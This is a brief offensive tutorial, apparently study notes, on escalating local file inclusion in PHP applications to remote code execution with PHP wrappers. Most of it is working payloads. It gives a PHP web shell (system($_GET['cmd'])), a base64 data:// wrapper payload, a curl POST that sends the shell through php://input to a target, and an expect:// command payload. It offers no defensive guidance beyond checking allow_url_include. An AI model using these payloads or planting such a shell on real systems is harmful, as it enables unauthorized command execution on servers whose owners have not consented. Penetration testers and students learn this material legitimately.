# LFI to RCE using PHP Wrappers

## 1. Introduction

PHP wrappers can be used to escalate LFI to Remote Code Execution (RCE).

---

## 2. Requirement

Check if:
```
allow_url_include = On
```

---

## 3. Data Wrapper

### Step 1: Create PHP shell
```
<?php system($_GET["cmd"]); ?>
```

### Step 2: Encode
```
echo '<?php system($_GET["cmd"]); ?>' | base64
```

### Step 3: Exploit
```
?language=data://text/plain;base64,<encoded>&cmd=id
```

---

## 4. Input Wrapper

### Exploit using POST
```
curl -X POST --data '<?php system($_GET["cmd"]); ?>' \
"http://target/index.php?language=php://input&cmd=id"
```

---

## 5. Expect Wrapper

### Direct command execution
```
?language=expect://id
```

---

## 6. Key Takeaways

- LFI can lead to RCE
- PHP wrappers enable command execution
- Always check allow_url_include
- Data wrapper is most commonly used
